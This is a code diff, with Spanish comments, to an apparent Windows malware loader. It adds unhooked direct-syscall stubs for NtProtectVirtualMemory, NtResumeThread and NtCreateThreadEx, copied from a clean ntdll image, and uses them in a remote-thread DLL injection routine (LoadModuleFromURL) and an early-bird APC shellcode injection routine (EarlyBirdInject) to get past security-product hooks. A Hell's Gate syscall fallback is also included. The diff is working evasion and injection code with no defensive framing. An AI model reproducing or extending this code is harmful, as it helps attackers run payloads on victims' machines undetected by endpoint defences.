@@ -233,6 +233,11 @@ typedef LONG NTSTATUS;
 #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
 #endif
 
+typedef NTSTATUS(NTAPI* myNtResumeThread)(
+    HANDLE ThreadHandle,
+    PULONG PreviousSuspendCount
+);
+
 typedef struct _UNICODE_STRING {
     USHORT Length;
     USHORT MaximumLength;
@@ -489,9 +494,34 @@ typedef NTSTATUS(NTAPI* myNtWriteVirtualMemory)(
     PSIZE_T NumberOfBytesWritten
 );
 
+typedef NTSTATUS(NTAPI* myNtProtectVirtualMemory)(
+    HANDLE ProcessHandle,
+    PVOID* BaseAddress,
+    PSIZE_T RegionSize,
+    ULONG NewProtect,
+    PULONG OldProtect
+);
+
+typedef NTSTATUS(NTAPI* myNtCreateThreadEx)(
+    PHANDLE ThreadHandle,
+    ACCESS_MASK DesiredAccess,
+    LPVOID ObjectAttributes,
+    HANDLE ProcessHandle,
+    LPTHREAD_START_ROUTINE StartRoutine,
+    LPVOID Argument,
+    ULONG CreateFlags,
+    SIZE_T ZeroBits,
+    SIZE_T StackSize,
+    SIZE_T MaximumStackSize,
+    LPVOID AttributeList
+);
+
 // Stubs globales
 myNtCreateFile g_pNtCreateFileUnhooked = NULL;
 myNtWriteVirtualMemory g_pNtWriteVirtualMemoryUnhooked = NULL;
+myNtProtectVirtualMemory g_pNtProtectVirtualMemoryUnhooked = NULL;
+myNtResumeThread g_pNtResumeThreadUnhooked = NULL;
+myNtCreateThreadEx g_pNtCreateThreadExUnhooked = NULL;
 
 // Convierte RVA a offset en archivo
 PVOID RVAtoRawOffset(DWORD_PTR RVA, PIMAGE_SECTION_HEADER section)
@@ -618,17 +648,98 @@ BOOL InitializeUnhookedSyscalls()
         return FALSE;
     }
 
+    // Extraer stub de NtProtectVirtualMemory
+    char* stubProtectMem = VirtualAlloc(NULL, SYSCALL_STUB_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!stubProtectMem) {
+        VirtualFree(stubCreateFile, 0, MEM_RELEASE);
+        VirtualFree(stubWriteMem, 0, MEM_RELEASE);
+        return FALSE;
+    }
+
+    if (!GetSyscallStub("NtProtectVirtualMemory", exportDir, fileData, textSection, rdataSection, stubProtectMem)) {
+        VirtualFree(fileData, 0, MEM_RELEASE);
+        VirtualFree(stubCreateFile, 0, MEM_RELEASE);
+        VirtualFree(stubWriteMem, 0, MEM_RELEASE);
+        VirtualFree(stubProtectMem, 0, MEM_RELEASE);
+        return FALSE;
+    }
+
+    DWORD oldProtect;
+    if (!VirtualProtect(stubProtectMem, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtect)) {
+        VirtualFree(stubCreateFile, 0, MEM_RELEASE);
+        VirtualFree(stubWriteMem, 0, MEM_RELEASE);
+        VirtualFree(stubProtectMem, 0, MEM_RELEASE);
+        return FALSE;
+    }
+
+    g_pNtProtectVirtualMemoryUnhooked = (myNtProtectVirtualMemory)stubProtectMem;
+
     VirtualFree(fileData, 0, MEM_RELEASE);
 
-    // Hacer ejecutables los stubs
-    DWORD oldProtect;
+    // Extraer stub de NtResumeThread
+    char* stubResumeThread = VirtualAlloc(NULL, SYSCALL_STUB_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!stubResumeThread) {
+        VirtualFree(stubCreateFile, 0, MEM_RELEASE);
+        VirtualFree(stubWriteMem, 0, MEM_RELEASE);
+        VirtualFree(stubProtectMem, 0, MEM_RELEASE);
+        return FALSE;
+    }
+
+    if (!GetSyscallStub("NtResumeThread", exportDir, fileData, textSection, rdataSection, stubResumeThread)) {
+        VirtualFree(fileData, 0, MEM_RELEASE);
+        VirtualFree(stubCreateFile, 0, MEM_RELEASE);
+        VirtualFree(stubWriteMem, 0, MEM_RELEASE);
+        VirtualFree(stubProtectMem, 0, MEM_RELEASE);
+        VirtualFree(stubResumeThread, 0, MEM_RELEASE);
+        return FALSE;
+    }
+
+    if (!VirtualProtect(stubResumeThread, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtect)) {
+        VirtualFree(stubCreateFile, 0, MEM_RELEASE);
+        VirtualFree(stubWriteMem, 0, MEM_RELEASE);
+        VirtualFree(stubProtectMem, 0, MEM_RELEASE);
+        VirtualFree(stubResumeThread, 0, MEM_RELEASE);
+        return FALSE;
+    }
+
+    g_pNtResumeThreadUnhooked = (myNtResumeThread)stubResumeThread;
+
     if (!VirtualProtect(stubCreateFile, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtect) ||
         !VirtualProtect(stubWriteMem, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtect)) {
         VirtualFree(stubCreateFile, 0, MEM_RELEASE);
         VirtualFree(stubWriteMem, 0, MEM_RELEASE);
         return FALSE;
     }
+    // Extraer stub de NtCreateThreadEx
+    char* stubCreateThread = VirtualAlloc(NULL, SYSCALL_STUB_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!stubCreateThread) {
+        VirtualFree(stubCreateFile, 0, MEM_RELEASE);
+        VirtualFree(stubWriteMem, 0, MEM_RELEASE);
+        VirtualFree(stubProtectMem, 0, MEM_RELEASE);
+        VirtualFree(stubResumeThread, 0, MEM_RELEASE);
+        return FALSE;
+    }
 
+    if (!GetSyscallStub("NtCreateThreadEx", exportDir, fileData, textSection, rdataSection, stubCreateThread)) {
+        VirtualFree(fileData, 0, MEM_RELEASE);
+        VirtualFree(stubCreateFile, 0, MEM_RELEASE);
+        VirtualFree(stubWriteMem, 0, MEM_RELEASE);
+        VirtualFree(stubProtectMem, 0, MEM_RELEASE);
+        VirtualFree(stubResumeThread, 0, MEM_RELEASE);
+        VirtualFree(stubCreateThread, 0, MEM_RELEASE);
+        return FALSE;
+    }
+
+    if (!VirtualProtect(stubCreateThread, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtect)) {
+        VirtualFree(stubCreateFile, 0, MEM_RELEASE);
+        VirtualFree(stubWriteMem, 0, MEM_RELEASE);
+        VirtualFree(stubProtectMem, 0, MEM_RELEASE);
+        VirtualFree(stubResumeThread, 0, MEM_RELEASE);
+        VirtualFree(stubCreateThread, 0, MEM_RELEASE);
+        return FALSE;
+    }
+
+    g_pNtCreateThreadExUnhooked = (myNtCreateThreadEx)stubCreateThread;
     // Asignar a variables globales
     g_pNtCreateFileUnhooked = (myNtCreateFile)stubCreateFile;
     g_pNtWriteVirtualMemoryUnhooked = (myNtWriteVirtualMemory)(LPVOID)stubWriteMem;
@@ -1332,13 +1443,37 @@ BOOL LoadModuleFromURL(const char* url) {
             return FALSE;
         }
 
-        // --- 8. Crear hilo remoto ---
-        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryA, pRemotePath, 0, NULL);
-        if (!hThread) {
-            printf("[-] CreateRemoteThread falló\n");
-            VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
-            CloseHandle(hProcess);
-            return FALSE;
+        // --- 8. Crear hilo remoto con NtCreateThreadEx unhooked ---
+        HANDLE hThread = NULL;
+        if (g_pNtCreateThreadExUnhooked) {
+            NTSTATUS status = g_pNtCreateThreadExUnhooked(
+                &hThread,
+                THREAD_ALL_ACCESS,
+                NULL,
+                hProcess,
+                (LPTHREAD_START_ROUTINE)pLoadLibraryA,
+                pRemotePath,
+                0,
+                0,
+                0,
+                0,
+                NULL
+            );
+            if (!NT_SUCCESS(status)) {
+                printf("[-] NtCreateThreadEx unhooked falló: 0x%08X\n", status);
+                VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
+                CloseHandle(hProcess);
+                return FALSE;
+            }
+        } else {
+            // Fallback
+            hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryA, pRemotePath, 0, NULL);
+            if (!hThread) {
+                printf("[-] CreateRemoteThread falló\n");
+                VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
+                CloseHandle(hProcess);
+                return FALSE;
+            }
         }
 
         WaitForSingleObject(hThread, 5000);
@@ -4325,14 +4460,33 @@ BOOL EarlyBirdInject(unsigned char* shellcode, int shellcode_len) {
     printf("[+] Shellcode escrito en proceso remoto.\n");
     fflush(stdout);
 
-    // VirtualProtectEx (API normal) - más discreto que NtProtectVirtualMemory
+    
+    // NtProtectVirtualMemory unhooked
     ULONG oldProtect = 0;
-    if (!VirtualProtectEx(hProcess, pRemoteMem, size, PAGE_EXECUTE_READ, &oldProtect)) {
-        printf("[-] VirtualProtectEx falló: %lu\n", GetLastError());
-        fflush(stdout);
-        CloseHandle(pi.hThread);
-        CloseHandle(pi.hProcess);
-        return FALSE;
+    if (g_pNtProtectVirtualMemoryUnhooked) {
+        NTSTATUS status = g_pNtProtectVirtualMemoryUnhooked(
+            hProcess,
+            &pRemoteMem,
+            &size,
+            PAGE_EXECUTE_READ,
+            &oldProtect
+        );
+        if (!NT_SUCCESS(status)) {
+            printf("[-] NtProtectVirtualMemory unhooked falló: 0x%08X\n", status);
+            fflush(stdout);
+            CloseHandle(pi.hThread);
+            CloseHandle(pi.hProcess);
+            return FALSE;
+        }
+    } else {
+        // Fallback
+        if (!VirtualProtectEx(hProcess, pRemoteMem, size, PAGE_EXECUTE_READ, &oldProtect)) {
+            printf("[-] VirtualProtectEx falló: %lu\n", GetLastError());
+            fflush(stdout);
+            CloseHandle(pi.hThread);
+            CloseHandle(pi.hProcess);
+            return FALSE;
+        }
     }
     printf("[+] Protección cambiada a PAGE_EXECUTE_READ.\n");
     fflush(stdout);
@@ -4354,14 +4508,33 @@ BOOL EarlyBirdInject(unsigned char* shellcode, int shellcode_len) {
     printf("[+] APC enqueued via NtQueueApcThread.\n");
     fflush(stdout);
 
-    // NtResumeThread (syscall)
+    // 🔹 NtResumeThread unhooked
     DWORD suspendCount;
-    HellsGate(ssn_resume);
-    status = HellDescent(
-        (DWORD64)hThread,
-        (DWORD64)&suspendCount,
-        0, 0, 0, 0
-    );
+    if (g_pNtResumeThreadUnhooked) {
+        status = g_pNtResumeThreadUnhooked(hThread, &suspendCount);
+        if (!NT_SUCCESS(status)) {
+            printf("[-] NtResumeThread unhooked falló: 0x%08X\n", status);
+            fflush(stdout);
+            CloseHandle(pi.hThread);
+            CloseHandle(pi.hProcess);
+            return FALSE;
+        }
+    } else {
+        // Fallback a Hell's Gate si el stub no está disponible
+        HellsGate(ssn_resume);
+        status = HellDescent(
+            (DWORD64)hThread,
+            (DWORD64)&suspendCount,
+            0, 0, 0, 0
+        );
+        if (!NT_SUCCESS(status)) {
+            printf("[-] NtResumeThread (Hell's Gate) falló: 0x%08X\n", status);
+            fflush(stdout);
+            CloseHandle(pi.hThread);
+            CloseHandle(pi.hProcess);
+            return FALSE;
+        }
+    }
     if (status != STATUS_SUCCESS) {
         printf("[-] NtResumeThread falló: 0x%08lX\n", (unsigned long)status);
         fflush(stdout);
